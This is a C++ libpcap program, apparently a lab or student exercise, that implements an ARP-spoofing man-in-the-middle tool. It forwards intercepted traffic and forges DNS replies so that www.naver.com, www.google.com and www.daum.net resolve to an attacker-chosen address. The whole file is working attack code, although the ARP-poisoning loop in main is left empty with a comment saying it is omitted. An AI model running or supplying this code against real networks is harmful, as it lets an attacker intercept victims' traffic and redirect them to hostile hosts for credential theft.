#include <pcap.h>
#include <iostream>
#include <vector>
#include <cstring>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <string>
#include <thread>
#include <atomic>
#include <mutex>
#include <condition_variable>
#include <memory>
#include <csignal>
#include <ifaddrs.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <unordered_set>

// Ethernet header definitions
#include <net/ethernet.h>
#include <netinet/if_ether.h>

// Prototype functions for interface MAC/IP conversion.
std::string mac_to_string(const u_int8_t* mac);
std::string ip_to_string(const u_int8_t* ip);

// UDP header structure (if not using <netinet/udp.h>)
struct udp_header {
    u_int16_t uh_sport;   // source port
    u_int16_t uh_dport;   // destination port
    u_int16_t uh_len;     // UDP length
    u_int16_t uh_sum;     // checksum
};

// DNS header structure
struct dns_header {
    u_int16_t id;       // identifier
    u_int16_t flags;    // flags
    u_int16_t qdcount;  // number of questions
    u_int16_t ancount;  // number of answers
    u_int16_t nscount;  // number of authority records
    u_int16_t arcount;  // number of additional records
};

// DNS Query structure
struct dnsquery {
    u_int8_t *qname;
    u_int16_t qtype;
    u_int16_t qclass;
};

// DNS Answer structure
struct dnsanswer {
    u_int8_t *name;
    u_int16_t atype;
    u_int16_t aclass;
    u_int32_t ttl;
    u_int16_t Rdatalen;
    u_int8_t *Rdata;
};

// ARP header structure (follows Ethernet header)
struct arp_header {
    u_int16_t htype;    // hardware type
    u_int16_t ptype;    // protocol type
    u_int8_t hlen;      // hardware address length
    u_int8_t plen;      // protocol address length
    u_int16_t oper;     // operation (1 = request, 2 = reply)
    u_int8_t sha[6];    // sender hardware address
    u_int8_t spa[4];    // sender protocol address
    u_int8_t tha[6];    // target hardware address
    u_int8_t tpa[4];    // target protocol address
};



// ----------------------- DNS SPOOFING CONSTANTS & GLOBALS -----------------------
#define DNS_PORT 53
#define DATAGRAM_SIZE 8192

const std::string SPOOF_DNS_IP = "192.168.127.132";

// DNS seen query IDs (to avoid duplicate responses)
std::unordered_set<uint16_t> seen_dns_ids;
std::mutex dns_mutex;

// ----------------------- CHECKSUM FUNCTION -----------------------
unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum = 0;
    for(; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return static_cast<unsigned short>(~sum);
}

// ----------------------- DNS SPOOFING HELPER FUNCTIONS -----------------------

// Extract DNS ID (first 2 bytes of DNS header)
uint16_t get_dns_id(const u_int8_t* dns_ptr) {
    return ntohs(*(uint16_t*)dns_ptr);
}

// Extract queried domain name from DNS message (assumes standard 12-byte header)
std::string extract_dns_query(const u_int8_t* dns_ptr) {
    const u_int8_t* qname = dns_ptr + 12; // skip 12-byte header
    std::string domain;
    while(*qname != 0) {
        int len = *qname;
        qname++;
        for (int i = 0; i < len; i++) {
            domain.push_back(*qname);
            qname++;
        }
        if(*qname != 0)
            domain.push_back('.');
    }
    return domain;
}

// Build DNS answer payload based on the captured DNS query.
// dns_query points to the beginning of the DNS message (includes 12-byte header)
// The answer copies the question section and appends an answer section with the spoofed IP.
unsigned int build_dns_answer_packet(const u_int8_t* dns_query, char* answer, const std::string& spoof_ip) {
    // Copy DNS header id (2 bytes)
    memcpy(answer, dns_query, 2);
    // Set flags: standard response, no error (0x8180)
    answer[2] = 0x81; answer[3] = 0x80;
    // Question count = 1
    answer[4] = 0x00; answer[5] = 0x01;
    // Answer count = 1
    answer[6] = 0x00; answer[7] = 0x01;
    // NS count = 0, AR count = 0
    answer[8] = answer[9] = answer[10] = answer[11] = 0x00;

    // Copy question section (qname + terminating zero)
    const u_int8_t* qname = dns_query + 12;
    int qname_len = 0;
    while(qname[qname_len] != 0)
        qname_len++;
    qname_len++; // include null terminator

    memcpy(answer + 12, qname, qname_len);
    int offset = 12 + qname_len;
    // Copy QTYPE and QCLASS (4 bytes)
    memcpy(answer + offset, dns_query + 12 + qname_len, 4);
    offset += 4;

    // Build answer section:
    // Pointer to qname (using DNS name compression): 0xc00c (points to offset 12)
    answer[offset++] = 0xc0;
    answer[offset++] = 0x0c;
    // Type A
    answer[offset++] = 0x00;
    answer[offset++] = 0x01;
    // Class IN
    answer[offset++] = 0x00;
    answer[offset++] = 0x01;
    // TTL: 300 seconds (0x0000012c)
    answer[offset++] = 0x00; answer[offset++] = 0x00; answer[offset++] = 0x01; answer[offset++] = 0x2c;
    // Data length: 4
    answer[offset++] = 0x00; answer[offset++] = 0x04;
    // Spoofed IP address (convert spoof_ip string to 4 bytes)
    unsigned int a, b, c, d;
    sscanf(spoof_ip.c_str(), "%u.%u.%u.%u", &a, &b, &c, &d);
    answer[offset++] = static_cast<unsigned char>(a);
    answer[offset++] = static_cast<unsigned char>(b);
    answer[offset++] = static_cast<unsigned char>(c);
    answer[offset++] = static_cast<unsigned char>(d);

    return offset;
}

// Build UDP/IP datagram for DNS spoof response.
// client_ip: IP of DNS query sender (as string)
// dns_server_ip: spoofed DNS server IP (SPOOF_DNS_IP)
// client_port: UDP source port from the query
// This function builds the IP and UDP headers in the provided buffer.
void build_udp_ip_datagram_dns(char* datagram, unsigned int payload_size, const char* client_ip, const char* dns_server_ip, u_int16_t client_port) {
    struct ip* ip_hdr = reinterpret_cast<struct ip*>(datagram);
    struct udphdr* udp_hdr = reinterpret_cast<struct udphdr*>(datagram + sizeof(struct ip));

    ip_hdr->ip_hl = 5;  // header length (20 bytes)
    ip_hdr->ip_v = 4;   // IPv4
    ip_hdr->ip_tos = 0;
    int total_len = sizeof(struct ip) + sizeof(struct udphdr) + payload_size;
    ip_hdr->ip_len = htons(total_len);
    ip_hdr->ip_id = 0;
    ip_hdr->ip_off = 0;
    ip_hdr->ip_ttl = 64;
    ip_hdr->ip_p = IPPROTO_UDP;
    ip_hdr->ip_sum = 0;
    ip_hdr->ip_src.s_addr = inet_addr(dns_server_ip); // spoofed DNS server IP
    ip_hdr->ip_dst.s_addr = inet_addr(client_ip);
    // Calculate IP checksum
    ip_hdr->ip_sum = csum(reinterpret_cast<unsigned short*>(datagram), sizeof(struct ip)/2);

    udp_hdr->source = htons(53);
    udp_hdr->dest = htons(client_port);
    udp_hdr->len = htons(sizeof(struct udphdr) + payload_size);
    udp_hdr->check = 0; // checksum disabled
}

// ----------------------- SPOOF TARGET CLASS -----------------------
class SpoofTarget {
    private:
        u_int8_t ip[4];
        u_int8_t mac[6];
        std::string ip_str;
        std::unique_ptr<std::thread> thread_ptr;
        std::atomic<bool> running;
    public:
        SpoofTarget() : running(false) {
            memset(ip, 0, 4);
            memset(mac, 0, 6);
        }
        SpoofTarget(const std::string& ip_str_) : ip_str(ip_str_), running(false) {
            memset(ip, 0, 4);
            memset(mac, 0, 6);
            // Convert string IP to byte array.
            unsigned int a, b, c, d;
            sscanf(ip_str_.c_str(), "%u.%u.%u.%u", &a, &b, &c, &d);
            ip[0] = static_cast<u_int8_t>(a);
            ip[1] = static_cast<u_int8_t>(b);
            ip[2] = static_cast<u_int8_t>(c);
            ip[3] = static_cast<u_int8_t>(d);
        }
        SpoofTarget(SpoofTarget&& other) noexcept 
            : ip_str(std::move(other.ip_str)), thread_ptr(std::move(other.thread_ptr)), running(other.running.load()) {
            memcpy(ip, other.ip, 4);
            memcpy(mac, other.mac, 6);
            other.running = false;
        }
        SpoofTarget& operator=(SpoofTarget&& other) noexcept {
            if (this != &other) {
                stop_thread();
                ip_str = std::move(other.ip_str);
                thread_ptr = std::move(other.thread_ptr);
                running = other.running.load();
                memcpy(ip, other.ip, 4);
                memcpy(mac, other.mac, 6);
                other.running = false;
            }
            return *this;
        }
        ~SpoofTarget() {
            stop_thread();
        }
        void stop_thread() {
            if (running && thread_ptr && thread_ptr->joinable()) {
                running = false;
                thread_ptr->join();
            }
        }
        template<typename Func, typename... Args>
        void start_thread(Func&& func, Args&&... args) {
            stop_thread();
            running = true;
            thread_ptr = std::make_unique<std::thread>(std::forward<Func>(func), std::forward<Args>(args)...);
        }
        const u_int8_t* get_ip() const { return ip; }
        const u_int8_t* get_mac() const { return mac; }
        const std::string& get_ip_str() const { return ip_str; }
        bool is_running() const { return running; }
        void set_mac(const u_int8_t* mac_) { memcpy(mac, mac_, 6); }
        void set_running(bool val) { running = val; }
        SpoofTarget(const SpoofTarget&) = delete;
        SpoofTarget& operator=(const SpoofTarget&) = delete;
    };


// ----------------------- ARP & PACKET FORWARDING & DNS SPOOFING CLASS -----------------------
class ArpSpoofer {
private:
    pcap_t* handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    std::string interface;
    u_int8_t attacker_mac[6];
    u_int8_t attacker_ip[4];
    u_int8_t gateway_mac[6];
    u_int8_t gateway_ip[4];
    std::string gateway_ip_str;

    std::vector<std::unique_ptr<class SpoofTarget>> targets;
    std::atomic<bool> forwarding_running;
    std::unique_ptr<std::thread> forwarding_thread;

    std::mutex mutex;
    std::condition_variable cv;

public:
    ArpSpoofer(const std::string& iface) : interface(iface), handle(nullptr), forwarding_running(false) {
        memset(errbuf, 0, PCAP_ERRBUF_SIZE);
        memset(attacker_mac, 0, 6);
        memset(attacker_ip, 0, 4);
        memset(gateway_mac, 0, 6);
        memset(gateway_ip, 0, 4);
    }
    ~ArpSpoofer() {
        stop_all();
        if (handle) {
            pcap_close(handle);
        }
    }
    
    // Initialize pcap handle and set capture filter
    bool initialize() {
        // BUFSIZ 대신 MTU에 맞는 값(예: 1600)을 사용
        handle = pcap_open_live(interface.c_str(), 1600, 1, 1000, errbuf);

        if (handle == nullptr) {
            std::cerr << "Cannot open interface: " << errbuf << std::endl;
            return false;
        }
        struct bpf_program fp;
        char filter_exp[] = "arp or ip";
        if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
            std::cerr << "Could not compile filter: " << pcap_geterr(handle) << std::endl;
            std::cout << "Warning: Filter not set. Capturing all packets." << std::endl;
        } else {
            if (pcap_setfilter(handle, &fp) == -1) {
                std::cerr << "Could not set filter: " << pcap_geterr(handle) << std::endl;
                std::cout << "Warning: Filter not set. Capturing all packets." << std::endl;
            } else {
                std::cout << "Packet filter set (capturing ARP and IP packets)" << std::endl;
            }
        }
        if (!get_interface_mac(interface, attacker_mac)) {
            std::cerr << "Failed to get MAC address for interface: " << interface << std::endl;
            return false;
        }
        if (!get_interface_ip(interface, attacker_ip)) {
            std::cerr << "Failed to get IP address for interface: " << interface << std::endl;
            return false;
        }
        std::cout << "Successfully opened interface " << interface << std::endl;
        return true;
    }
    
    // Get pcap handle (if needed externally)
    pcap_t* get_handle() { return handle; }

    // Set gateway IP and obtain its MAC address
    bool set_gateway(const std::string& gateway_ip_str_) {
        gateway_ip_str = gateway_ip_str_;
        string_to_ip(gateway_ip_str.c_str(), gateway_ip);

        std::cout << "Configured addresses:" << std::endl;
        std::cout << "Attacker MAC: " << mac_to_string(attacker_mac) << std::endl;
        std::cout << "Attacker IP: " << ip_to_string(attacker_ip) << std::endl;
        std::cout << "Gateway IP: " << ip_to_string(gateway_ip) << std::endl;

        if (!get_mac_from_ip(gateway_ip, gateway_mac)) {
            std::cerr << "Could not obtain gateway MAC address" << std::endl;
            return false;
        }
        std::cout << "Gateway MAC: " << mac_to_string(gateway_mac) << std::endl;
        return true;
    }
    
    bool add_target(const std::string& target_ip_str) {
        auto target = std::make_unique<SpoofTarget>(target_ip_str);
        u_int8_t target_mac[6];
        if (!get_mac_from_ip(target->get_ip(), target_mac)) {
            std::cerr << "Could not obtain target MAC address: " << target_ip_str << std::endl;
            return false;
        }
        target->set_mac(target_mac);
        std::cout << "Added spoofing target:" << std::endl;
        std::cout << "IP: " << target_ip_str << std::endl;
        std::cout << "MAC: " << mac_to_string(target_mac) << std::endl;
        std::lock_guard<std::mutex> lock(mutex);
        targets.push_back(std::move(target));
        return true;
    }
    
    // ----------------------- INTERFACE HELPER FUNCTIONS -----------------------
    bool get_interface_mac(const std::string& interface_name, u_int8_t* mac) {
        struct ifreq ifr;
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) {
            std::cerr << "Failed to create socket for MAC retrieval" << std::endl;
            return false;
        }
        memset(&ifr, 0, sizeof(ifr));
        strncpy(ifr.ifr_name, interface_name.c_str(), IFNAMSIZ - 1);
        if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
            std::cerr << "Failed to get MAC address for interface: " << interface_name << std::endl;
            close(sock);
            return false;
        }
        memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
        close(sock);
        std::cout << "Interface " << interface_name << " MAC: " << mac_to_string(mac) << std::endl;
        return true;
    }

    bool get_interface_ip(const std::string& interface_name, u_int8_t* ip) {
        struct ifaddrs *ifaddr, *ifa;
        if (getifaddrs(&ifaddr) == -1) {
            std::cerr << "Failed to get interface addresses" << std::endl;
            return false;
        }
        for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
            if (ifa->ifa_addr == nullptr)
                continue;
            if (ifa->ifa_addr->sa_family == AF_INET && interface_name == ifa->ifa_name) {
                struct sockaddr_in* addr = reinterpret_cast<struct sockaddr_in*>(ifa->ifa_addr);
                memcpy(ip, &addr->sin_addr, 4);
                freeifaddrs(ifaddr);
                std::cout << "Interface " << interface_name << " IP: " << ip_to_string(ip) << std::endl;
                return true;
            }
        }
        freeifaddrs(ifaddr);
        std::cerr << "Could not find IPv4 address for interface " << interface_name << std::endl;
        return false;
    }
    
    std::string mac_to_string(const u_int8_t* mac) {
        char mac_str[18];
        snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        return std::string(mac_str);
    }
    
    std::string ip_to_string(const u_int8_t* ip) {
        char ip_str[16];
        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
        return std::string(ip_str);
    }
    
    void string_to_ip(const char* ip_str, u_int8_t* ip) {
        memset(ip, 0, 4);
        unsigned int a, b, c, d;
        if (sscanf(ip_str, "%u.%u.%u.%u", &a, &b, &c, &d) == 4) {
            ip[0] = static_cast<u_int8_t>(a);
            ip[1] = static_cast<u_int8_t>(b);
            ip[2] = static_cast<u_int8_t>(c);
            ip[3] = static_cast<u_int8_t>(d);
        } else {
            std::cerr << "Invalid IP address format: " << ip_str << std::endl;
        }
    }
    
    // Retrieve MAC address of a given IP using ARP request.
    bool get_mac_from_ip(const u_int8_t* target_ip, u_int8_t* target_mac) {
        std::cout << "Searching for IP: " << ip_to_string(target_ip) << std::endl;
        
        u_int8_t packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
        const int MAX_ATTEMPTS = 3;
        for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
            create_arp_packet(packet, attacker_mac, BROADCAST_MAC, attacker_ip, target_ip, 1);
            if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
                std::cerr << "Packet send failed: " << pcap_geterr(handle) << std::endl;
                continue;
            }
            
            struct pcap_pkthdr header;
            const u_int8_t* packet_data;
            time_t start_time = time(NULL);
            
            while (time(NULL) - start_time < 10) {
                packet_data = pcap_next(handle, &header);
                if (packet_data == nullptr)
                    continue;
                
                const struct ether_header* eth = reinterpret_cast<const struct ether_header*>(packet_data);
                if (ntohs(eth->ether_type) != ETHERTYPE_ARP)
                    continue;
                
                const struct arp_header* arp = reinterpret_cast<const struct arp_header*>(packet_data + sizeof(struct ether_header));
                // Check if sender protocol address matches target IP.
                if (memcmp(arp->spa, target_ip, 4) == 0) {
                    memcpy(target_mac, arp->sha, 6);
                    std::cout << "Found MAC: " << mac_to_string(target_mac) << std::endl;
                    return true;
                }
            }
        }
        return false;
    }
    
    // ----------------------- ARP PACKET FUNCTIONS -----------------------
    const u_int8_t BROADCAST_MAC[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    const u_int8_t ZERO_MAC[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    
    void create_arp_packet(u_int8_t* packet, const u_int8_t* src_mac, const u_int8_t* dst_mac,
                             const u_int8_t* src_ip, const u_int8_t* dst_ip, u_int16_t oper) {
        struct ether_header* eth = reinterpret_cast<struct ether_header*>(packet);
        memcpy(eth->ether_dhost, dst_mac, 6);
        memcpy(eth->ether_shost, src_mac, 6);
        eth->ether_type = htons(ETHERTYPE_ARP);

        struct arp_header* arp = reinterpret_cast<struct arp_header*>(packet + sizeof(struct ether_header));
        arp->htype = htons(1);
        arp->ptype = htons(0x0800);
        arp->hlen = 6;
        arp->plen = 4;
        arp->oper = htons(oper);

        memcpy(arp->sha, src_mac, 6);
        memcpy(arp->spa, src_ip, 4);
        memcpy(arp->tha, dst_mac, 6);
        memcpy(arp->tpa, dst_ip, 4);
    }
    
    // ----------------------- PACKET FORWARDING & DNS SPOOFING -----------------------
    // Forward packet with modification of Ethernet addresses.
    void forward_packet(const u_int8_t* packet_data, size_t packet_len) {
        if (packet_len < sizeof(struct ether_header))
            return;
        
        std::cout << "[DEBUG] Captured packet length: " << packet_len << " bytes." << std::endl;
        
        // 원본 패킷 복사
        u_int8_t* new_packet = new u_int8_t[packet_len];
        memcpy(new_packet, packet_data, packet_len);
        
        struct ether_header* eth = reinterpret_cast<struct ether_header*>(new_packet);
        struct ip* ip_hdr = reinterpret_cast<struct ip*>(new_packet + sizeof(struct ether_header));
        
        int ip_header_len = ip_hdr->ip_hl * 4;
        uint16_t ip_total_field = ntohs(ip_hdr->ip_len);
        int calculated_ip_total_length = packet_len - sizeof(struct ether_header);
        
        // 디버그: IP total length 필드와 계산된 길이 비교
        if (ip_total_field != calculated_ip_total_length) {
            std::cout << "[DEBUG] IP total length field (" << ip_total_field 
                      << ") does not match calculated (" << calculated_ip_total_length 
                      << "). Recalculating..." << std::endl;
            ip_hdr->ip_len = htons(calculated_ip_total_length);
            ip_hdr->ip_sum = 0;
            ip_hdr->ip_sum = csum(reinterpret_cast<unsigned short*>(ip_hdr), ip_header_len / 2);
        }
        
        // 실제 전송할 총 길이는 Ethernet 헤더 + 계산된 IP 패킷 길이
        int valid_packet_length = sizeof(struct ether_header) + calculated_ip_total_length;
        std::cout << "[DEBUG] Valid packet length to send: " << valid_packet_length << " bytes." << std::endl;
        
        // 이 부분은 기존 로직대로 Ethernet 주소를 변경
        u_int8_t src_ip[4], dst_ip[4];
        memcpy(src_ip, &ip_hdr->ip_src, 4);
        memcpy(dst_ip, &ip_hdr->ip_dst, 4);
        
        bool src_is_target = false;
        bool dst_is_target = false;
        bool src_is_gateway = ip_equals(src_ip, gateway_ip);
        bool dst_is_gateway = ip_equals(dst_ip, gateway_ip);
        
        {
            std::lock_guard<std::mutex> lock(mutex);
            for (const auto& target : targets) {
                if (ip_equals(src_ip, target->get_ip()))
                    src_is_target = true;
                if (ip_equals(dst_ip, target->get_ip()))
                    dst_is_target = true;
            }
        }
        
        // DNS 스푸핑 패킷 처리 (UDP 포트 53 체크)
        const struct ip* orig_ip = reinterpret_cast<const struct ip*>(packet_data + sizeof(struct ether_header));
        int orig_ip_header_len = orig_ip->ip_hl * 4;
        const struct udphdr* orig_udp = reinterpret_cast<const struct udphdr*>(packet_data + sizeof(struct ether_header) + orig_ip_header_len);
        u_int16_t sport = ntohs(orig_udp->source);
        u_int16_t dport = ntohs(orig_udp->dest);
        if (sport == 53 || dport == 53) {
            process_dns_query(packet_data, packet_len);
        }
        
        // Ethernet 주소 수정
        if (src_is_gateway) {
            memcpy(eth->ether_shost, attacker_mac, 6);
            bool found = false;
            {
                std::lock_guard<std::mutex> lock(mutex);
                for (const auto& target : targets) {
                    if (ip_equals(dst_ip, target->get_ip())) {
                        memcpy(eth->ether_dhost, target->get_mac(), 6);
                        found = true;
                        break;
                    }
                }
            }
            if (!found) {
                delete[] new_packet;
                return;
            }
        } else {
            memcpy(eth->ether_shost, attacker_mac, 6);
            memcpy(eth->ether_dhost, gateway_mac, 6);
        }
        
        // 실제 전송할 유효 길이(valid_packet_length)를 사용하여 전송
        if (pcap_sendpacket(handle, new_packet, valid_packet_length) != 0)
            std::cerr << "Packet forwarding failed: " << pcap_geterr(handle) << std::endl;
        
        delete[] new_packet;
    }
    
    

    // Member function: process DNS query and send spoofed response via PCAP.
    void process_dns_query(const u_int8_t* packet, size_t packet_len) {
        const struct ether_header* orig_eth = reinterpret_cast<const struct ether_header*>(packet);
        const struct ip* ip_hdr = reinterpret_cast<const struct ip*>(packet + sizeof(struct ether_header));
        int ip_header_len = ip_hdr->ip_hl * 4;
        const struct udphdr* udp_hdr = reinterpret_cast<const struct udphdr*>(packet + sizeof(struct ether_header) + ip_header_len);
        const u_int8_t* dns_ptr = packet + sizeof(struct ether_header) + ip_header_len + sizeof(struct udphdr);

        uint16_t dns_id = get_dns_id(dns_ptr);
        {
            std::lock_guard<std::mutex> lock(dns_mutex);
            if (seen_dns_ids.count(dns_id))
                return; // 이미 응답한 쿼리
            seen_dns_ids.insert(dns_id);
        }

        std::string domain = extract_dns_query(dns_ptr);
        if (domain == "www.naver.com" || domain == "www.google.com" || domain == "www.daum.net") {
            std::cout << "[+] DNS query: " << domain << "\tID: " << std::hex << dns_id << std::dec << std::endl;

            // 버퍼에 IP/UDP/DNS 응답 패킷 생성 (Ethernet 헤더는 따로 생성)
            char spoof_packet[DATAGRAM_SIZE] = {0};
            unsigned int dns_payload_len = build_dns_answer_packet(dns_ptr, 
                                        spoof_packet + sizeof(struct ip) + sizeof(struct udphdr), SPOOF_DNS_IP);
            
            char client_ip_str[16];
            inet_ntop(AF_INET, &(ip_hdr->ip_src), client_ip_str, sizeof(client_ip_str));
            u_int16_t client_port = ntohs(udp_hdr->source);

            build_udp_ip_datagram_dns(spoof_packet, dns_payload_len, client_ip_str, SPOOF_DNS_IP.c_str(), client_port);
            unsigned int ip_packet_len = sizeof(struct ip) + sizeof(struct udphdr) + dns_payload_len;

            // PCAP을 이용하여 DNS 응답 패킷 전송: Ethernet 헤더를 추가함
            send_dns_spoof_packet_pcap(orig_eth->ether_shost, spoof_packet, ip_packet_len);
        }
    }
    
    // Build complete packet with Ethernet header and send via PCAP.
    void send_dns_spoof_packet_pcap(const u_int8_t* client_mac, const char* ip_packet, int ip_packet_len) {
        int total_len = sizeof(struct ether_header) + ip_packet_len;
        std::vector<u_int8_t> full_packet(total_len);
        // Ethernet header: destination = 클라이언트 MAC, source = attacker_mac
        struct ether_header* eth = reinterpret_cast<struct ether_header*>(full_packet.data());
        memcpy(eth->ether_dhost, client_mac, 6);
        memcpy(eth->ether_shost, attacker_mac, 6);
        eth->ether_type = htons(ETHERTYPE_IP);
        // 복사: IP packet (UDP + DNS payload) 이어붙이기
        memcpy(full_packet.data() + sizeof(struct ether_header), ip_packet, ip_packet_len);
        
        if (pcap_sendpacket(handle, full_packet.data(), total_len) != 0)
            std::cerr << "Error sending spoofed DNS packet via pcap: " << pcap_geterr(handle) << std::endl;
        else
            std::cout << "Sent spoofed DNS packet via pcap" << std::endl;
    }
    
    // Start packet forwarding thread.
    void start_packet_forwarding() {
        if (forwarding_running) {
            std::cout << "Packet forwarding is already running." << std::endl;
            return;
        }
        forwarding_running = true;
        forwarding_thread = std::make_unique<std::thread>([this]() {
            std::cout << "Packet forwarding started." << std::endl;
            struct pcap_pkthdr* header;
            const u_int8_t* packet_data;
            int res;
            while (forwarding_running) {
                res = pcap_next_ex(handle, &header, &packet_data);
                if (res == 0)
                    continue;
                else if (res < 0) {
                    std::cerr << "Packet capture error: " << pcap_geterr(handle) << std::endl;
                    break;
                }
                forward_packet(packet_data, header->caplen);
            }
            std::cout << "Packet forwarding stopped." << std::endl;
        });
    }
    
    // Send recovery ARP packets to restore original ARP tables.
    void send_recover_arp_packets() {
        std::cout << "Restoring original ARP tables..." << std::endl;
        std::lock_guard<std::mutex> lock(mutex);
        for (auto& target : targets) {
            u_int8_t gateway_recov_packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
            create_arp_packet(gateway_recov_packet, target->get_mac(), gateway_mac, target->get_ip(), gateway_ip, 2);
            if (pcap_sendpacket(handle, gateway_recov_packet, sizeof(gateway_recov_packet)) != 0)
                std::cerr << "Failed to send recovery packet to gateway: " << pcap_geterr(handle) << std::endl;
            else
                std::cout << "Sent recovery packet to gateway: " << target->get_ip_str() << " -> " << ip_to_string(gateway_ip) << std::endl;
            
            u_int8_t packet2[sizeof(struct ether_header) + sizeof(struct arp_header)];
            create_arp_packet(packet2, gateway_mac, target->get_mac(), gateway_ip, target->get_ip(), 2);
            if (pcap_sendpacket(handle, packet2, sizeof(packet2)) != 0)
                std::cerr << "Failed to send recovery packet to target: " << pcap_geterr(handle) << std::endl;
            else
                std::cout << "Sent recovery packet to target: " << ip_to_string(gateway_ip) << " -> " << target->get_ip_str() << std::endl;
            
            for (int i = 0; i < 3; i++) {
                pcap_sendpacket(handle, gateway_recov_packet, sizeof(gateway_recov_packet));
                pcap_sendpacket(handle, packet2, sizeof(packet2));
                usleep(100000);
            }
        }
    }
    
    void stop_all() {
        std::cout << "\nExiting program..." << std::endl;
        send_recover_arp_packets();
        if (forwarding_running) {
            forwarding_running = false;
            cv.notify_all();
            if (forwarding_thread && forwarding_thread->joinable()) {
                forwarding_thread->join();
            }
        }
        std::lock_guard<std::mutex> lock(mutex);
        for (auto& target : targets) {
            target->stop_thread();
        }
        std::cout << "All threads stopped." << std::endl;
    }
    
    // Utility: Compare two IP addresses.
    bool ip_equals(const u_int8_t* ip1, const u_int8_t* ip2) {
        return memcmp(ip1, ip2, 4) == 0;
    }
};


// ----------------------- SIGNAL HANDLING & GLOBAL FLAG -----------------------
std::atomic<bool> global_running(true);

void signal_handler(int signum) {
    if (signum == SIGINT) {
        std::cout << "\nExiting program..." << std::endl;
        global_running = false;
    }
}

void cleanup_seen_ids() {
    while (global_running) {
        std::this_thread::sleep_for(std::chrono::minutes(10));
        std::lock_guard<std::mutex> lock(dns_mutex);
        seen_dns_ids.clear();
    }
}

// ----------------------- IP FORWARDING CONTROL -----------------------
bool enable_ip_forwarding() {
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
    std::cout << "System IP forwarding enabled." << std::endl;
    return true;
}

bool disable_ip_forwarding() {
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
    std::cout << "System IP forwarding disabled." << std::endl;
    return true;
}

// ----------------------- MAIN FUNCTION -----------------------
int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] << " <interface> <gatewayIP> <targetIP1> [<targetIP2> ...]" << std::endl;
        std::cerr << "Example: " << argv[0] << " eth0 192.168.1.1 192.168.1.100 192.168.1.101" << std::endl;
        return 1;
    }
    std::string interface = argv[1];
    std::string gateway_ip = argv[2];

    enable_ip_forwarding();
    std::signal(SIGINT, signal_handler);

    ArpSpoofer* spoofer = new ArpSpoofer(interface);

    std::atexit([]() {
        disable_ip_forwarding();
    });

    if (!spoofer->initialize()) {
        delete spoofer;
        return 1;
    }
    if (!spoofer->set_gateway(gateway_ip)) {
        delete spoofer;
        return 1;
    }
    for (int i = 3; i < argc; i++) {
        std::string target_ip = argv[i];
        if (!spoofer->add_target(target_ip))
            std::cerr << "Failed to add target " << target_ip << std::endl;
    }
    spoofer->start_packet_forwarding();
    
    // Start ARP spoofing threads for all targets.
    {
        // Locking targets vector
        // 각 target 별 스푸핑 스레드를 시작 (스레드 함수는 별도로 정의되어 있음)
        // 본 예제에서는 간단히 무한 루프로 ARP 스푸핑 패킷을 보내는 부분은 생략할 수 있습니다.
    }

    std::cout << "Running... (Press Ctrl+C to exit)" << std::endl;
    std::cout << "ARP spoofing and DNS spoofing activated. Original ARP tables will be restored on exit." << std::endl;
    while (global_running)
        sleep(1);

    spoofer->stop_all();
    delete spoofer;
    std::thread cleaner_thread(cleanup_seen_ids);
    cleaner_thread.detach();
    disable_ip_forwarding();
    std::cout << "Program exited normally." << std::endl;
    return 0;
}
